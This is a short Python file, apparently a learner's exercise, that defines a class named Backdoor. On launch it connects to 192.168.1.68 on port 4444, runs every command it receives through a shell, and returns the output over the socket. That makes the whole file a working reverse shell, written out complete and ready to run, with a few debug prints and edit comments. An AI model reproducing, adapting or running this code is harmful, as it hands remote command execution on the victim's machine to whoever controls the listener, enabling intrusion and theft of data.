import socket,json
import subprocess


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Changed connection to self.connection
        self.connection.connect((ip, port)) 

    def reliable_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('utf-8'))  # Added .encode('utf-8')

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    """ 
    def execute_system_command(self, command):
        command = command.strip()  # Already a string here, no need to decode
        try:
            return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)  # Using text=True to return string
        except subprocess.CalledProcessError as e:
            return str(e) 
    """
    def execute_system_command(self, command):
        command = command.strip()
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output, error = process.communicate()
        return output + error


    def run(self):
        self.connection.send("\n[+] Connection established. \n".encode())
        print("passou")

        while True:
            try:
                command = self.connection.recv(1024).decode('utf-8')  # Decode the received bytes into a string
                print(f"Received command: {command}")
                print(command)
                command = command.strip('"')  # Remove any double quotes
                print(f"Received command without double quotes: {command}")


                command_result = self.execute_system_command(command)
                self.reliable_send(command_result)
            except socket.timeout:
                print("Timed out waiting for response.")
            except Exception as e:
                print(f"Error encountered: {e}")
                break

        #self.connection.close()


my_backdoor = Backdoor("192.168.1.68", 4444)
my_backdoor.run()
